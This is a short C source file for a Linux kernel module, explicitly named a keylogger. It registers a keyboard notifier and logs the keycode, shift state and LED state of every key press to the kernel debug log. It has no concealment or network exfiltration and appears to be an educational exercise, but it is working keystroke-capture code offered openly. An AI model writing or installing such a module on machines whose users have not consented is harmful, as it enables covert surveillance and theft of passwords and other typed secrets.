#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>

#define KEY_PRESSED 1
#define KEY_NOT_PRESSED 0

MODULE_AUTHOR("Reilly Moore, Brandon Cryderman");
MODULE_LICENSE("GPL");

/*
	keyboard_notifier_callback
	must be of the type notifier_fn_t(notifier_block *nb,
									  unsigned long action, void *data)
*/
int keyboard_notifier_callback(struct notifier_block *nb, unsigned long action, void *data){
	struct keyboard_notifier_param *kb = data;

	/*
		http://lxr.free-electrons.com/source/include/linux/notifier.h#L206
		for action == KBD_KEYCODE
	*/
	if(action == KBD_KEYCODE && kb->down == KEY_PRESSED){
		printk(KERN_DEBUG "{\n");
		printk(KERN_DEBUG "		kb->down: %d\n", kb->down);
		printk(KERN_DEBUG "		kb->shift: %d\n", kb->shift);
		printk(KERN_DEBUG "		kb->ledstate: %d\n", kb->ledstate);
		printk(KERN_DEBUG "		kb->value: %d\n}\n", kb->value);
	}

	return 0;
} 

static struct notifier_block nb;

static int __init init_keylogger(void){
	nb.notifier_call = keyboard_notifier_callback;
	register_keyboard_notifier(&nb);

	return 0;
}

static void __exit exit_keylogger(void){
	unregister_keyboard_notifier(&nb);
}

module_init(init_keylogger);
module_exit(exit_keylogger);